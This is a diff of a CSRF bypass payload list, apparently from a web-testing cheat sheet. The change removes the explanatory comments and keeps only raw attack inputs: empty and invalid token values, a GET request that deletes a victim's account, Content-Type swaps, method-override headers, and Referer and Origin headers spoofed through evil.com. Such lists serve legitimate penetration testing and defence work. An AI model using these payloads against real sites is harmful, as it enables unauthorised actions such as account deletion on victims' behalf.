@@ -1,57 +1,27 @@
-# ============================================================
-# CSRF — Token Bypass Techniques
-# ============================================================
-
-# ---- Remove Token ----
-# Simply omit the CSRF token parameter from request
-# POST /account/settings with no csrf_token field
-
-# ---- Empty Token ----
 csrf_token=
 csrf=
 _csrf=
 token=
 authenticity_token=
 
-# ---- Invalid Token ----
 csrf_token=invalid
 csrf_token=0
 csrf_token=null
 csrf_token=undefined
 csrf_token=AAAAAAAAAA
 
-# ---- Copy Token from Another User ----
-# Obtain your own CSRF token, use it for another user's request
-
-# ---- Use GET Instead of POST ----
-# If server doesn't validate CSRF for GET requests
-# Some endpoints accidentally accept GET
 GET /account/delete?user_id=victim HTTP/1.1
 
-# ---- Content-Type Bypass ----
-# CSRF protection may only apply to certain content types
 Content-Type: text/plain
 Content-Type: application/x-www-form-urlencoded
 Content-Type: multipart/form-data
-# Try JSON: some frameworks skip CSRF for JSON
 Content-Type: application/json
 
-# ---- Referer Header Manipulation ----
 Referer: https://target.com.evil.com
 Referer: https://evil.com?https://target.com
-# Remove Referer entirely (some servers rely only on Referer)
 
-# ---- HTTP Method Override ----
 X-HTTP-Method-Override: POST
 _method=POST
 
-# ---- CORS Misconfiguration + CSRF ----
-# If CORS allows arbitrary origins with credentials
-
-# ---- Double Submit Cookie Bypass ----
-# If CSRF = value in both cookie and parameter:
-# Create cookie with same name and value on target subdomain
-
-# ---- Origin Header Bypass ----
 Origin: https://target.com.evil.com
 Origin: null
